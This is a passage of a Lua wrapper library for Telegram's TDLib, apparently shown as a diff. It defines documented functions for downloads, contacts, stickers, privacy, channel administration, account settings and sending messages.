downloadFile(file_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DownloadFile"", +    file_id_ = file_id +  }, dl_cb, cmd) +end + +M.downloadFile = downloadFile + +-- Stops file downloading. +-- If file already downloaded do nothing. +-- @file_id Identifier of file to cancel download +local function cancelDownloadFile(file_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CancelDownloadFile"", +    file_id_ = file_id +  }, dl_cb, cmd) +end + +M.cancelDownloadFile = cancelDownloadFile + +-- Next part of a file was generated +-- @generation_id Identifier of the generation process +-- @ready Number of bytes already generated. Negative number means that generation has failed and should be terminated +local function setFileGenerationProgress(generation_id, ready, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetFileGenerationProgress"", +    generation_id_ = generation_id, +    ready_ = ready +  }, dl_cb, cmd) +end + +M.setFileGenerationProgress = setFileGenerationProgress + +-- Finishes file generation +-- @generation_id Identifier of the generation process +local function finishFileGeneration(generation_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""FinishFileGeneration"", +    generation_id_ = generation_id +  }, dl_cb, cmd) +end + +M.finishFileGeneration = finishFileGeneration + +-- Generates new chat invite link, previously generated link is revoked. +-- Available for group and channel chats. +-- Only creator of the chat can export chat invite link +-- @chat_id Chat identifier +local function exportChatInviteLink(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ExportChatInviteLink"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.exportChatInviteLink = exportChatInviteLink + +-- Checks chat invite link for validness and returns information about the corresponding chat +-- @invite_link Invite link to check. Should begin with ""https://telegram.me/joinchat/"" +local function checkChatInviteLink(link, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CheckChatInviteLink"", +    invite_link_ = link +  }, dl_cb, cmd) +end + +M.checkChatInviteLink = checkChatInviteLink + +-- Imports chat invite link, adds current user to a chat if possible. +-- Member will not be added until chat state will be synchronized with the server. +-- Member will not be added if application is killed before it can send request to the server +-- @invite_link Invite link to import. Should begin with ""https://telegram.me/joinchat/"" +local function importChatInviteLink(invite_link, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ImportChatInviteLink"", +    invite_link_ = invite_link +  }, dl_cb, cmd) +end + +M.importChatInviteLink = importChatInviteLink + +-- Adds user to black list +-- @user_id User identifier +local function blockUser(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""BlockUser"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.blockUser = blockUser + +-- Removes user from black list +-- @user_id User identifier +local function unblockUser(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""UnblockUser"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.unblockUser = unblockUser + +-- Returns users blocked by the current user +-- @offset Number of users to skip in result, must be non-negative +-- @limit Maximum number of users to return, can\'t be greater than 100 +local function getBlockedUsers(offset, limit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetBlockedUsers"", +    offset_ = offset, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getBlockedUsers = getBlockedUsers + +-- Adds new contacts/edits existing contacts, contacts user identifiers are ignored. +-- Returns list of corresponding users in the same order as input contacts. +-- If contact doesn\'t registered in Telegram, user with id == 0 will be returned +-- @contacts List of contacts to import/edit +local function importContacts(phone_number, first_name, last_name, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ImportContacts"", +    contacts_ = {[0] = { +      phone_number_ = tostring(phone_number), +      first_name_ = tostring(first_name), +      last_name_ = tostring(last_name), +      user_id_ = user_id +      }, +    }, +  }, dl_cb, cmd) +end + +M.importContacts = importContacts + +-- Searches for specified query in the first name, last name and username of the known user contacts +-- @query Query to search for, can be empty to return all contacts +-- @limit Maximum number of users to be returned +local function searchContacts(query, limit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SearchContacts"", +    query_ = query, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.searchContacts = searchContacts + +-- Deletes users from contacts list +-- @user_ids Identifiers of users to be deleted +local function deleteContacts(user_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteContacts"", +    user_ids_ = user_ids -- vector +  }, dl_cb, cmd) +end + +M.deleteContacts = deleteContacts + +-- Returns profile photos of the user. +-- Result of this query can\'t be invalidated, so it must be used with care +-- @user_id User identifier +-- @offset Photos to skip, must be non-negative +-- @limit Maximum number of photos to be returned, can\'t be greater than 100 +local function getUserProfilePhotos(user_id, offset, limit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetUserProfilePhotos"", +    user_id_ = user_id, +    offset_ = offset, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getUserProfilePhotos = getUserProfilePhotos + +-- Returns stickers corresponding to given emoji +-- @emoji String representation of emoji. If empty, returns all known stickers +local function getStickers(emoji, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetStickers"", +    emoji_ = emoji +  }, dl_cb, cmd) +end + +M.getStickers = getStickers + +-- Returns list of installed sticker sets without archived sticker sets +-- @is_masks Pass true to return masks, pass false to return stickers +local function getStickerSets(is_masks, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetStickerSets"", +    is_masks_ = is_masks +  }, dl_cb, cmd) +end + +M.getStickerSets = getStickerSets + +-- Returns list of archived sticker sets +-- @is_masks Pass true to return masks, pass false to return stickers +-- @offset_sticker_set_id Identifier of the sticker set from which return the result +-- @limit Maximum number of sticker sets to return +local function getArchivedStickerSets(is_masks, offset_sticker_set_id, limit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetArchivedStickerSets"", +    is_masks_ = is_masks, +    offset_sticker_set_id_ = offset_sticker_set_id, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getArchivedStickerSets = getArchivedStickerSets + +-- Returns list of trending sticker sets +local function getTrendingStickerSets(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetTrendingStickerSets"" +  }, dl_cb, cmd) +end + +M.getTrendingStickerSets = getTrendingStickerSets + +-- Returns list of sticker sets attached to a file, currently only photos and videos can have attached sticker sets +-- @file_id File identifier +local function getAttachedStickerSets(file_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetAttachedStickerSets"", +    file_id_ = file_id +  }, dl_cb, cmd) +end + +M.getAttachedStickerSets = getAttachedStickerSets + +-- Returns information about sticker set by its identifier +-- @set_id Identifier of the sticker set +local function getStickerSet(set_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetStickerSet"", +    set_id_ = set_id +  }, dl_cb, cmd) +end + +M.getStickerSet = getStickerSet + +-- Searches sticker set by its short name +-- @name Name of the sticker set +local function searchStickerSet(name, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SearchStickerSet"", +    name_ = name +  }, dl_cb, cmd) +end + +M.searchStickerSet = searchStickerSet + +-- Installs/uninstalls or enables/archives sticker set. +-- Official sticker set can\'t be uninstalled, but it can be archived +-- @set_id Identifier of the sticker set +-- @is_installed New value of is_installed +-- @is_archived New value of is_archived +local function updateStickerSet(set_id, is_installed, is_archived, dl_cb, cmd) +  tdcli_function ({ +    ID = ""UpdateStickerSet"", +    set_id_ = set_id, +    is_installed_ = is_installed, +    is_archived_ = is_archived +  }, dl_cb, cmd) +end + +M.updateStickerSet = updateStickerSet + +-- Trending sticker sets are viewed by the user +-- @sticker_set_ids Identifiers of viewed trending sticker sets +local function viewTrendingStickerSets(sticker_set_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ViewTrendingStickerSets"", +    sticker_set_ids_ = sticker_set_ids -- vector +  }, dl_cb, cmd) +end + +M.viewTrendingStickerSets = viewTrendingStickerSets + +-- Changes the order of installed sticker sets +-- @is_masks Pass true to change masks order, pass false to change stickers order +-- @sticker_set_ids Identifiers of installed sticker sets in the new right order +local function reorderStickerSets(is_masks, sticker_set_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ReorderStickerSets"", +    is_masks_ = is_masks, +    sticker_set_ids_ = sticker_set_ids -- vector +  }, dl_cb, cmd) +end + +M.reorderStickerSets = reorderStickerSets + +-- Returns list of recently used stickers +-- @is_attached Pass true to return stickers and masks recently attached to photo or video files, pass false to return recently sent stickers +local function getRecentStickers(is_attached, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetRecentStickers"", +    is_attached_ = is_attached +  }, dl_cb, cmd) +end + +M.getRecentStickers = getRecentStickers + +-- Manually adds new sticker to the list of recently used stickers. +-- New sticker is added to the beginning of the list. +-- If the sticker is already in the list, at first it is removed from the list +-- @is_attached Pass true to add the sticker to the list of stickers recently attached to photo or video files, pass false to add the sticker to the list of recently sent stickers +-- @sticker Sticker file to add +local function addRecentSticker(is_attached, sticker, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AddRecentSticker"", +    is_attached_ = is_attached, +    sticker_ = getInputFile(sticker) +  }, dl_cb, cmd) +end + +M.addRecentSticker = addRecentSticker + +-- Removes a sticker from the list of recently used stickers +-- @is_attached Pass true to remove the sticker from the list of stickers recently attached to photo or video files, pass false to remove the sticker from the list of recently sent stickers +-- @sticker Sticker file to delete +local function deleteRecentSticker(is_attached, sticker, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteRecentSticker"", +    is_attached_ = is_attached, +    sticker_ = getInputFile(sticker) +  }, dl_cb, cmd) +end + +M.deleteRecentSticker = deleteRecentSticker + +-- Clears list of recently used stickers +-- @is_attached Pass true to clear list of stickers recently attached to photo or video files, pass false to clear the list of recently sent stickers +local function clearRecentStickers(is_attached, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ClearRecentStickers"", +    is_attached_ = is_attached +  }, dl_cb, cmd) +end + +M.clearRecentStickers = clearRecentStickers + +-- Returns emojis corresponding to a sticker +-- @sticker Sticker file identifier +local function getStickerEmojis(sticker, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetStickerEmojis"", +    sticker_ = getInputFile(sticker) +  }, dl_cb, cmd) +end + +M.getStickerEmojis = getStickerEmojis + +-- Returns saved animations +local function getSavedAnimations(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetSavedAnimations"", +  }, dl_cb, cmd) +end + +M.getSavedAnimations = getSavedAnimations + +-- Manually adds new animation to the list of saved animations. +-- New animation is added to the beginning of the list. +-- If the animation is already in the list, at first it is removed from the list. +-- Only non-secret video animations with MIME type ""video/mp4"" can be added to the list +-- @animation Animation file to add. Only known to server animations (i. e. successfully sent via message) can be added to the list +local function addSavedAnimation(animation, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AddSavedAnimation"", +    animation_ = getInputFile(animation) +  }, dl_cb, cmd) +end + +M.addSavedAnimation = addSavedAnimation + +-- Removes animation from the list of saved animations +-- @animation Animation file to delete +local function deleteSavedAnimation(animation, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteSavedAnimation"", +    animation_ = getInputFile(animation) +  }, dl_cb, cmd) +end + +M.deleteSavedAnimation = deleteSavedAnimation + +-- Returns up to 20 recently used inline bots in the order of the last usage +local function getRecentInlineBots(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetRecentInlineBots"", +  }, dl_cb, cmd) +end + +M.getRecentInlineBots = getRecentInlineBots + +-- Get web page preview by text of the message. +-- Do not call this function to often +-- @message_text Message text +local function getWebPagePreview(message_text, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetWebPagePreview"", +    message_text_ = message_text +  }, dl_cb, cmd) +end + +M.getWebPagePreview = getWebPagePreview + +-- Returns notification settings for a given scope +-- @scope Scope to return information about notification settings +-- scope = Chat(chat_id)|PrivateChats|GroupChats|AllChats| +local function getNotificationSettings(scope, chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetNotificationSettings"", +    scope_ = { +      ID = \'NotificationSettingsFor\' .. scope, +      chat_id_ = chat_id or nil +    }, +  }, dl_cb, cmd) +end + +M.getNotificationSettings = getNotificationSettings + +-- Changes notification settings for a given scope +-- @scope Scope to change notification settings +-- @notification_settings New notification settings for given scope +-- scope = Chat(chat_id)|PrivateChats|GroupChats|AllChats| +local function setNotificationSettings(scope, chat_id, mute_for, show_preview, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetNotificationSettings"", +    scope_ = { +      ID = \'NotificationSettingsFor\' .. scope, +      chat_id_ = chat_id or nil +    }, +    notification_settings_ = { +      ID = ""NotificationSettings"", +      mute_for_ = mute_for, +      sound_ = ""default"", +      show_preview_ = show_preview +    } +  }, dl_cb, cmd) +end + +M.setNotificationSettings = setNotificationSettings + +-- Resets all notification settings to the default value. +-- By default the only muted chats are supergroups, sound is set to \'default\' and message previews are showed +local function resetAllNotificationSettings(dl_cb, cmd) +  tdcli_function ({ +    ID = ""ResetAllNotificationSettings"" +  }, dl_cb, cmd) +end + +M.resetAllNotificationSettings = resetAllNotificationSettings + +-- Uploads new profile photo for logged in user. +-- Photo will not change until change will be synchronized with the server. +-- Photo will not be changed if application is killed before it can send request to the server. +-- If something changes, updateUser will be sent +-- @photo_path Path to new profile photo +local function setProfilePhoto(photo_path, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetProfilePhoto"", +    photo_path_ = photo_path +  }, dl_cb, cmd) +end + +M.setProfilePhoto = setProfilePhoto + +-- Deletes profile photo. +-- If something changes, updateUser will be sent +-- @profile_photo_id Identifier of profile photo to delete +local function deleteProfilePhoto(profile_photo_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteProfilePhoto"", +    profile_photo_id_ = profile_photo_id +  }, dl_cb, cmd) +end + +M.deleteProfilePhoto = deleteProfilePhoto + +-- Changes first and last names of logged in user. +-- If something changes, updateUser will be sent +-- @first_name New value of user first name, 1-255 characters +-- @last_name New value of optional user last name, 0-255 characters +local function changeName(first_name, last_name, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeName"", +    first_name_ = first_name, +    last_name_ = last_name +  }, dl_cb, cmd) +end + +M.changeName = changeName + +-- Changes about information of logged in user +-- @about New value of userFull.about, 0-255 characters +local function changeAbout(about, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeAbout"", +    about_ = about +  }, dl_cb, cmd) +end + +M.changeAbout = changeAbout + +-- Changes username of logged in user. +-- If something changes, updateUser will be sent +-- @username New value of username. Use empty string to remove username +local function changeUsername(username, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeUsername"", +    username_ = username +  }, dl_cb, cmd) +end + +M.changeUsername = changeUsername + +-- Changes user\'s phone number and sends authentication code to the new user\'s phone number. +-- Returns authStateWaitCode with information about sent code on success +-- @phone_number New user\'s phone number in any reasonable format +-- @allow_flash_call Pass True, if code can be sent via flash call to the specified phone number +-- @is_current_phone_number Pass true, if the phone number is used on the current device. Ignored if allow_flash_call is False +local function changePhoneNumber(phone_number, allow_flash_call, is_current_phone_number, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangePhoneNumber"", +    phone_number_ = phone_number, +    allow_flash_call_ = allow_flash_call, +    is_current_phone_number_ = is_current_phone_number +  }, dl_cb, cmd) +end + +M.changePhoneNumber = changePhoneNumber + +-- Resends authentication code sent to change user\'s phone number. +-- Works only if in previously received authStateWaitCode next_code_type was not null. +-- Returns authStateWaitCode on success +local function resendChangePhoneNumberCode(dl_cb, cmd) +  tdcli_function ({ +    ID = ""ResendChangePhoneNumberCode"", +  }, dl_cb, cmd) +end + +M.resendChangePhoneNumberCode = resendChangePhoneNumberCode + +-- Checks authentication code sent to change user\'s phone number. +-- Returns authStateOk on success +-- @code Verification code from SMS, voice call or flash call +local function checkChangePhoneNumberCode(code, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CheckChangePhoneNumberCode"", +    code_ = code +  }, dl_cb, cmd) +end + +M.checkChangePhoneNumberCode = checkChangePhoneNumberCode + +-- Returns all active sessions of logged in user +local function getActiveSessions(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetActiveSessions"", +  }, dl_cb, cmd) +end + +M.getActiveSessions = getActiveSessions + +-- Terminates another session of logged in user +-- @session_id Session identifier +local function terminateSession(session_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""TerminateSession"", +    session_id_ = session_id +  }, dl_cb, cmd) +end + +M.terminateSession = terminateSession + +-- Terminates all other sessions of logged in user +local function terminateAllOtherSessions(dl_cb, cmd) +  tdcli_function ({ +    ID = ""TerminateAllOtherSessions"", +  }, dl_cb, cmd) +end + +M.terminateAllOtherSessions = terminateAllOtherSessions + +-- Gives or revokes all members of the group editor rights. +-- Needs creator privileges in the group +-- @group_id Identifier of the group +-- @anyone_can_edit New value of anyone_can_edit +local function toggleGroupEditors(group_id, anyone_can_edit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ToggleGroupEditors"", +    group_id_ = getChatId(group_id).ID, +    anyone_can_edit_ = anyone_can_edit +  }, dl_cb, cmd) +end + +M.toggleGroupEditors = toggleGroupEditors + +-- Changes username of the channel. +-- Needs creator privileges in the channel +-- @channel_id Identifier of the channel +-- @username New value of username. Use empty string to remove username +local function changeChannelUsername(channel_id, username, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChannelUsername"", +    channel_id_ = getChatId(channel_id).ID, +    username_ = username +  }, dl_cb, cmd) +end + +M.changeChannelUsername = changeChannelUsername + +-- Gives or revokes right to invite new members to all current members of the channel. +-- Needs creator privileges in the channel. +-- Available only for supergroups +-- @channel_id Identifier of the channel +-- @anyone_can_invite New value of anyone_can_invite +local function toggleChannelInvites(channel_id, anyone_can_invite, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ToggleChannelInvites"", +    channel_id_ = getChatId(channel_id).ID, +    anyone_can_invite_ = anyone_can_invite +  }, dl_cb, cmd) +end + +M.toggleChannelInvites = toggleChannelInvites + +-- Enables or disables sender signature on sent messages in the channel. +-- Needs creator privileges in the channel. +-- Not available for supergroups +-- @channel_id Identifier of the channel +-- @sign_messages New value of sign_messages +local function toggleChannelSignMessages(channel_id, sign_messages, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ToggleChannelSignMessages"", +    channel_id_ = getChatId(channel_id).ID, +    sign_messages_ = sign_messages +  }, dl_cb, cmd) +end + +M.toggleChannelSignMessages = toggleChannelSignMessages + +-- Changes information about the channel. +-- Needs creator privileges in the broadcast channel or editor privileges in the supergroup channel +-- @channel_id Identifier of the channel +-- @about New value of about, 0-255 characters +local function changeChannelAbout(channel_id, about, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChannelAbout"", +    channel_id_ = getChatId(channel_id).ID, +    about_ = about +  }, dl_cb, cmd) +end + +M.changeChannelAbout = changeChannelAbout + +-- Pins a message in a supergroup channel chat. +-- Needs editor privileges in the channel +-- @channel_id Identifier of the channel +-- @message_id Identifier of the new pinned message +-- @disable_notification True, if there should be no notification about the pinned message +local function pinChannelMessage(channel_id, message_id, disable_notification, dl_cb, cmd) +  tdcli_function ({ +    ID = ""PinChannelMessage"", +    channel_id_ = getChatId(channel_id).ID, +    message_id_ = message_id, +    disable_notification_ = disable_notification +  }, dl_cb, cmd) +end + +M.pinChannelMessage = pinChannelMessage + +-- Removes pinned message in the supergroup channel. +-- Needs editor privileges in the channel +-- @channel_id Identifier of the channel +local function unpinChannelMessage(channel_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""UnpinChannelMessage"", +    channel_id_ = getChatId(channel_id).ID +  }, dl_cb, cmd) +end + +M.unpinChannelMessage = unpinChannelMessage + +-- Reports some supergroup channel messages from a user as spam messages +-- @channel_id Channel identifier +-- @user_id User identifier +-- @message_ids Identifiers of messages sent in the supergroup by the user, the list should be non-empty +local function reportChannelSpam(channel_id, user_id, message_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ReportChannelSpam"", +    channel_id_ = getChatId(channel_id).ID, +    user_id_ = user_id, +    message_ids_ = message_ids -- vector +  }, dl_cb, cmd) +end + +M.reportChannelSpam = reportChannelSpam + +-- Returns information about channel members or kicked from channel users. +-- Can be used only if channel_full->can_get_members == true +-- @channel_id Identifier of the channel +-- @filter Kind of channel users to return, defaults to channelMembersRecent +-- @offset Number of channel users to skip +-- @limit Maximum number of users be returned, can\'t be greater than 200 +-- filter = Recent|Administrators|Kicked|Bots +local function getChannelMembers(channel_id, offset, filter, limit, dl_cb, cmd) +  if not limit or limit > 200 then +    limit = 200 +  end + +  tdcli_function ({ +    ID = ""GetChannelMembers"", +    channel_id_ = getChatId(channel_id).ID, +    filter_ = { +      ID = ""ChannelMembers"" .. filter +    }, +    offset_ = offset, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getChannelMembers = getChannelMembers + +-- Deletes channel along with all messages in corresponding chat. +-- Releases channel username and removes all members. +-- Needs creator privileges in the channel. +-- Channels with more than 1000 members can\'t be deleted +-- @channel_id Identifier of the channel +local function deleteChannel(channel_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteChannel"", +    channel_id_ = getChatId(channel_id).ID +  }, dl_cb, cmd) +end + +M.deleteChannel = deleteChannel + +-- Returns list of created public channels +local function getCreatedPublicChannels(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetCreatedPublicChannels"" +  }, dl_cb, cmd) +end + +M.getCreatedPublicChannels = getCreatedPublicChannels + +-- Closes secret chat +-- @secret_chat_id Secret chat identifier +local function closeSecretChat(secret_chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CloseSecretChat"", +    secret_chat_id_ = secret_chat_id +  }, dl_cb, cmd) +end + +M.closeSecretChat = closeSecretChat + +-- Returns user that can be contacted to get support +local function getSupportUser(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetSupportUser"", +  }, dl_cb, cmd) +end + +M.getSupportUser = getSupportUser + +-- Returns background wallpapers +local function getWallpapers(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetWallpapers"", +  }, dl_cb, cmd) +end + +M.getWallpapers = getWallpapers + +-- Registers current used device for receiving push notifications +-- @device_token Device token +-- device_token = apns|gcm|mpns|simplePush|ubuntuPhone|blackberry +local function registerDevice(device_token, token, device_token_set, dl_cb, cmd) +  local dToken = {ID = device_token .. \'DeviceToken\', token_ = token} + +  if device_token_set then +    dToken = {ID = ""DeviceTokenSet"", token_ = device_token_set} -- tokens:vector<DeviceToken> +  end + +  tdcli_function ({ +    ID = ""RegisterDevice"", +    device_token_ = dToken +  }, dl_cb, cmd) +end + +M.registerDevice = registerDevice + +-- Returns list of used device tokens +local function getDeviceTokens(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetDeviceTokens"", +  }, dl_cb, cmd) +end + +M.getDeviceTokens = getDeviceTokens + +-- Changes privacy settings +-- @key Privacy key +-- @rules New privacy rules +-- @privacyKeyUserStatus Privacy key for managing visibility of the user status +-- @privacyKeyChatInvite Privacy key for managing ability of invitation of the user to chats +-- @privacyRuleAllowAll Rule to allow all users +-- @privacyRuleAllowContacts Rule to allow all user contacts +-- @privacyRuleAllowUsers Rule to allow specified users +-- @user_ids User identifiers +-- @privacyRuleDisallowAll Rule to disallow all users +-- @privacyRuleDisallowContacts Rule to disallow all user contacts +-- @privacyRuleDisallowUsers Rule to disallow all specified users +-- key = UserStatus|ChatInvite +-- rules = AllowAll|AllowContacts|AllowUsers(user_ids)|DisallowAll|DisallowContacts|DisallowUsers(user_ids) +local function setPrivacy(key, rule, allowed_user_ids, disallowed_user_ids, dl_cb, cmd) +  local rules = {[0] = {ID = \'PrivacyRule\' .. rule}} + +  if allowed_user_ids then +    rules = { +      { +        ID = \'PrivacyRule\' .. rule +      }, +      [0] = { +        ID = ""PrivacyRuleAllowUsers"", +        user_ids_ = allowed_user_ids -- vector +      }, +    } +  end +  if disallowed_user_ids then +    rules = { +      { +        ID = \'PrivacyRule\' .. rule +      }, +      [0] = { +        ID = ""PrivacyRuleDisallowUsers"", +        user_ids_ = disallowed_user_ids -- vector +      }, +    } +  end +  if allowed_user_ids and disallowed_user_ids then +    rules = { +      { +        ID = \'PrivacyRule\' .. rule +      }, +      { +        ID = ""PrivacyRuleAllowUsers"", +        user_ids_ = allowed_user_ids +      }, +      [0] = { +        ID = ""PrivacyRuleDisallowUsers"", +        user_ids_ = disallowed_user_ids +      }, +    } +  end +  tdcli_function ({ +    ID = ""SetPrivacy"", +    key_ = { +      ID = \'PrivacyKey\' .. key +    }, +    rules_ = { +      ID = ""PrivacyRules"", +      rules_ = rules +    }, +  }, dl_cb, cmd) +end + +M.setPrivacy = setPrivacy + +-- Returns current privacy settings +-- @key Privacy key +-- key = UserStatus|ChatInvite +local function getPrivacy(key, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetPrivacy"", +    key_ = { +      ID = ""PrivacyKey"" .. key +    }, +  }, dl_cb, cmd) +end + +M.getPrivacy = getPrivacy + +-- Returns value of an option by its name. +-- See list of available options on https://core.telegram.org/tdlib/options +-- @name Name of the option +local function getOption(name, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetOption"", +    name_ = name +  }, dl_cb, cmd) +end + +M.getOption = getOption + +-- Sets value of an option. +-- See list of available options on https://core.telegram.org/tdlib/options. +-- Only writable options can be set +-- @name Name of the option +-- @value New value of the option +local function setOption(name, option, value, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetOption"", +    name_ = name, +    value_ = { +      ID = \'Option\' .. option, +      value_ = value +    }, +  }, dl_cb, cmd) +end + +M.setOption = setOption + +-- Changes period of inactivity, after which the account of currently logged in user will be automatically deleted +-- @ttl New account TTL +local function changeAccountTtl(days, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeAccountTtl"", +    ttl_ = { +      ID = ""AccountTtl"", +      days_ = days +    }, +  }, dl_cb, cmd) +end + +M.changeAccountTtl = changeAccountTtl + +-- Returns period of inactivity, after which the account of currently logged in user will be automatically deleted +local function getAccountTtl(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetAccountTtl"", +  }, dl_cb, cmd) +end + +M.getAccountTtl = getAccountTtl + +-- Deletes the account of currently logged in user, deleting from the server all information associated with it. +-- Account\'s phone number can be used to create new account, but only once in two weeks +-- @reason Optional reason of account deletion +local function deleteAccount(reason, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteAccount"", +    reason_ = reason +  }, dl_cb, cmd) +end + +M.deleteAccount = deleteAccount + +-- Returns current chat report spam state +-- @chat_id Chat identifier +local function getChatReportSpamState(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetChatReportSpamState"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.getChatReportSpamState = getChatReportSpamState + +-- Reports chat as a spam chat or as not a spam chat. +-- Can be used only if ChatReportSpamState.can_report_spam is true. +-- After this request ChatReportSpamState.can_report_spam became false forever +-- @chat_id Chat identifier +-- @is_spam_chat If true, chat will be reported as a spam chat, otherwise it will be marked as not a spam chat +local function changeChatReportSpamState(chat_id, is_spam_chat, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChatReportSpamState"", +    chat_id_ = chat_id, +    is_spam_chat_ = is_spam_chat +  }, dl_cb, cmd) +end + +M.changeChatReportSpamState = changeChatReportSpamState + +-- Bots only. +-- Informs server about number of pending bot updates if they aren\'t processed for a long time +-- @pending_update_count Number of pending updates +-- @error_message Last error\'s message +local function setBotUpdatesStatus(pending_update_count, error_message, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetBotUpdatesStatus"", +    pending_update_count_ = pending_update_count, +    error_message_ = error_message +  }, dl_cb, cmd) +end + +M.setBotUpdatesStatus = setBotUpdatesStatus + +-- Returns Ok after specified amount of the time passed +-- @seconds Number of seconds before that function returns +local function setAlarm(seconds, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetAlarm"", +    seconds_ = seconds +  }, dl_cb, cmd) +end + +M.setAlarm = setAlarm + +-- Text message +-- @text Text to send +-- @disable_notification Pass true, to disable notification about the message, doesn\'t works in secret chats +-- @from_background Pass true, if the message is sent from background +-- @reply_markup Bots only. Markup for replying to message +-- @disable_web_page_preview Pass true to disable rich preview for link in the message text +-- @clear_draft Pass true if chat draft message should be deleted +-- @entities Bold, Italic, Code, Pre, PreCode and TextUrl entities contained in the text. Non-bot users can\'t use TextUrl entities. Can\'t be used with non-null parse_mode +-- @parse_mode Text parse mode, nullable. Can\'t be used along with enitities +local function sendMessage(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode) +  local TextParseMode = getParseMode(parse_mode) +   +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = 1, +    reply_markup_ = nil, +    input_message_content_ = { +      ID = ""InputMessageText"", +      text_ = text, +      disable_web_page_preview_ = disable_web_page_preview, +      clear_draft_ = 0, +      entities_ = {}, +      parse_mode_ = TextParseMode, +    }, +  }, dl_cb, nil) +end + +M.sendMessage = sendMessage + +-- Animation message +-- @animation Animation file to send +-- @thumb Animation thumb, if available +-- @width Width of the animation, may be replaced by the server +-- @height Height of the animation, may be replaced by the server +-- @caption Animation caption, 0-200 characters +local function sendAnimation(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, animation, width, height, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    reply_markup_ = reply_markup, +    input_message_content_ = { +      ID = ""InputMessageAnimation"", +      animation_ = getInputFile(animation), +      --thumb_ = { +        --ID = ""InputThumb"", +        --path_ = path, +        --width_ = width, +        --height_ = height +      --}, +      width_ = width or \'\', +      height_ = height or \'\', +      caption_ = caption or \'\' +    }, +  }, dl_cb, cmd) +end + +M.sendAnimation = sendAnimation + +-- Audio message +-- @audio Audio file to send +-- @album_cover_thumb Thumb of the album\'s cover, if available +-- @duration Duration of audio in seconds, may be replaced by the server +-- @title Title of the audio, 0-64 characters, may be replaced by the server +-- @performer 